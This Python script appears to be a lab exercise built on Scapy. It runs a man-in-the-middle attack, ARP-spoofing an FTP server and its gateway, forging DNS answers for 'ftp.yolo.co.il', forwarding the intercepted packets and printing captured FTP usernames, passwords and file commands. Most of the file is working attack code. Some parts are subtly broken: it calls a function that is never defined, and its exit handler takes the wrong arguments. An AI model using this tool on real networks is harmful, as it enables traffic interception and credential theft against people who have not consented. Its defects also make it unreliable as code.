#!/usr/bin/env python3
"""
MITM Packet Sniffer, Forwarder, and DNS Spoofer
───────────────────────────────────────────────

🔎 Description:
    This tool performs a Man-in-the-Middle (MITM) attack by ARP spoofing
    between an FTP server and the default gateway. It captures FTP traffic,
    logs credentials, supports DNS spoofing for `ftp.yolo.co.il`, and
    forwards intercepted packets manually. It's designed for scenarios where
    the attacker is on the same subnet as the FTP server but the client is
    located in a different subnet.

📌 Key Features:
    • ARP spoofing between FTP server and gateway
    • DNS spoofing for `ftp.yolo.co.il` → attacker's IP
    • Packet forwarding without relying on OS IP forwarding
    • Detection of EPSV 229 responses to monitor FTP data channels
    • Logging of FTP credentials (USER/PASS), file commands (RETR/STOR)
    • PCAP capture of all forwarded packets
    • Graceful ARP table restoration on script termination

🌐 Network Configuration Example:
    • FTP Server:    192.168.2.3
    • FTP Client:    192.168.3.1 (different subnet)
    • Gateway:       192.168.2.254
    • Attacker Host: 192.168.2.2


👤 Author: Ben
"""


from scapy.all import *
import time
import threading
import signal
import sys
import os
import re


# Configuration
interface      = "eth0"

# IP addresses
ftp_server_ip  = "192.168.2.3"   # FTP Server
client_ip      = "192.168.3.1"   # FTP Client (in different subnet)
gateway_ip     = "192.168.2.254" # Network Gateway

# Attacker machine details
attacker_ip    = "192.168.2.2"

# MAC addresses (will be auto-detected)
ftp_server_mac = None
attacker_mac   = None
gateway_mac    = None

# PCAP file for saving captured packets
pcap_filename  = "captured_traffic.pcap"

# Store active data channels (for file transfer)
data_channels = {}

def get_mac(ip):
    """
    Get the MAC address of an IP using an ARP request.
    """
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=interface)
        for _, rcv in ans:
            return rcv[Ether].src
    except Exception as e:
        print(f"Error getting MAC for {ip}: {e}")
    return None

def get_self_mac():
    """
    Get the MAC address of the attacker machine's interface.
    """
    try:
        return get_if_hwaddr(interface)
    except Exception as e:
        print(f"Error getting own MAC address: {e}")
        return None

def arp_spoof(target_ip, target_mac, spoof_ip):
    """
    Send an ARP reply to a target, making it think that spoof_ip belongs to attacker_mac.
    """
    try:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=spoof_ip, hwsrc=attacker_mac)
        send(packet, iface=interface, verbose=False)
    except Exception as e:
        print(f"Error in ARP spoofing: {e}")

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    """
    Restore original ARP mappings by sending correct ARP replies.
    """
    try:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=source_ip, hwsrc=source_mac)
        send(packet, iface=interface, verbose=False)
        print(f"Restored ARP for {target_ip} -> {source_ip}")
    except Exception as e:
        print(f"Error restoring ARP: {e}")

def cleanup():
    """
    Restore original ARP mappings by sending correct ARP replies to all affected hosts.
    """
    print("\n[*] Restoring ARP tables...")
    # Restore ARP tables multiple times to ensure it takes effect
    for _ in range(3):
        # FTP server should know gateway's real MAC
        restore_arp(ftp_server_ip, ftp_server_mac, gateway_ip, gateway_mac)
        # Gateway should know FTP server's real MAC
        restore_arp(gateway_ip, gateway_mac, ftp_server_ip, ftp_server_mac)
        time.sleep(0.5)
    
    sys.exit(0)

def start_arp_spoofing():
    """
    Continuously send ARP spoof packets at a high frequency.
    Focus on the FTP server and gateway since the client is in another subnet.
    """
    print("[*] Starting ARP spoofing...")
    while True:
        try:
            # Spoof FTP server → Make it think attacker is the gateway
            arp_spoof(ftp_server_ip, ftp_server_mac, gateway_ip)
            
            # Spoof gateway → Make it think attacker is the FTP server
            arp_spoof(gateway_ip, gateway_mac, ftp_server_ip)

            # Send more frequently for better reliability
            time.sleep(0.5)
        except Exception as e:
            print(f"Error in ARP spoofing thread: {e}")
            time.sleep(1)


def spoof_dns_response(packet):
    """
    Spoof DNS response to make the client think that 'ftp.yolo.co.il' resolves to the attacker's IP.
    """
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
        dns_query_name = packet[DNS].qd.qname.decode()
        if dns_query_name == "ftp.yolo.co.il.":
            print(f"[+] Spoofing DNS response for {dns_query_name}")
            
            # Create a DNS response
            dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                           UDP(dport=packet[UDP].sport, sport=53) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, \
                               an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=attacker_ip))
            
            # Send the spoofed DNS response to the client
            send(dns_response, iface=interface, verbose=False)
            print(f"[+] Sent spoofed DNS response: {attacker_ip} for {dns_query_name}")
            print(f"[+] Sent spoofed DNS packet: {dns_response.show()}")

            return True
    return False


def process_packet(packet):
    """
    Process and forward packets without relying on system IP forwarding.
    Focus on intercepting traffic between FTP server and gateway.
    """

    # Only process IP packets with Ethernet headers
    if not packet.haslayer(Ether) or not packet.haslayer(IP):
        return

    # Don't process ARP packets generated by our spoofing
    if packet.haslayer(ARP):
        return
    
    # Don't process packets we're sending ourselves to avoid loops
    if packet[Ether].src == attacker_mac:
        return

    # Save all valid packets to PCAP
    wrpcap(pcap_filename, packet, append=True)

    # Check for DNS queries for ftp.yolo.co.il and spoof if needed
    if spoof_dns_response(packet):
        return

    # Extract packet details
    src_mac = packet[Ether].src
    dst_mac = packet[Ether].dst
    src_ip = packet[IP].src
    dst_ip = packet[IP].dst

    # Log FTP credentials if present
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            if "USER" in payload or "PASS" in payload:
                print(f"[FTP] Credentials captured: {payload.strip()}")
            elif "RETR" in payload or "STOR" in payload:
                print(f"[FTP] File transfer command: {payload.strip()}")
            elif "EPSV" in payload:
                print(f"[FTP] File transfer command: {payload.strip()}")
            
            # Capture data channel info when 229 response is detected
            capture_ftp_data_channel(packet)
        except:
            pass
  
    try:
        new_packet = packet.copy()
    except:
        # If copying fails, try to create from raw bytes
        try:
            new_packet = Ether(bytes(packet))
        except:
            print("[!] Failed to clone packet")
            return

    # Packet forwarding logic focused on FTP server and gateway
    try:
        # Determine forwarding based on source and destination
        if src_ip == ftp_server_ip:
            # Traffic from FTP server
            new_packet[Ether].src = attacker_mac
            new_packet[Ether].dst = gateway_mac
            print(f"[>] FTP server -> Gateway (for {dst_ip}): {len(packet)} bytes")
        
        elif dst_ip == ftp_server_ip:
            # Traffic to FTP server
            new_packet[Ether].src = attacker_mac
            new_packet[Ether].dst = ftp_server_mac
            print(f"[<] {src_ip} -> FTP server: {len(packet)} bytes")
        
        else:
            # Unrelated traffic, don't forward
            return

        # Adjust TTL and checksums
        if new_packet[IP].ttl > 1:
            new_packet[IP].ttl -= 1
        
        # Delete checksums to force recalculation
        del new_packet[IP].chksum
        if new_packet.haslayer(TCP):
            del new_packet[TCP].chksum
        elif new_packet.haslayer(UDP):
            del new_packet[UDP].chksum
        
        # Forward the packet
        sendp(new_packet, iface=interface, verbose=False)
#        new_packet.show()
    except Exception as e:
        print(f"Error forwarding packet: {e}")

def sniff_and_forward():
    """
    Sniff traffic involving the FTP server.
    """
    print("[*] Starting packet sniffing and forwarding...")
    # Create a filter to capture relevant traffic
    bpf_filter = f"host {ftp_server_ip} and not arp"
    try:
        sniff(filter=bpf_filter, prn=process_packet, store=0, iface=interface)
    except Exception as e:
        print(f"Error during packet sniffing: {e}")

if __name__ == "__main__":
    # Set up exit handler to restore ARP tables
    signal.signal(signal.SIGINT, cleanup)

    # Get initial MAC addresses
    ftp_server_mac = get_mac(ftp_server_ip)
    gateway_mac    = get_mac(gateway_ip)
    attacker_mac   = get_self_mac()

    if not (ftp_server_mac and gateway_mac and attacker_mac):
        print("Error: Could not retrieve all necessary MAC addresses.")
        sys.exit(1)

    # Start ARP spoofing and packet sniffing
    spoof_thread = threading.Thread(target=start_arp_spoofing)
    spoof_thread.daemon = True
    spoof_thread.start()

    sniff_and_forward()

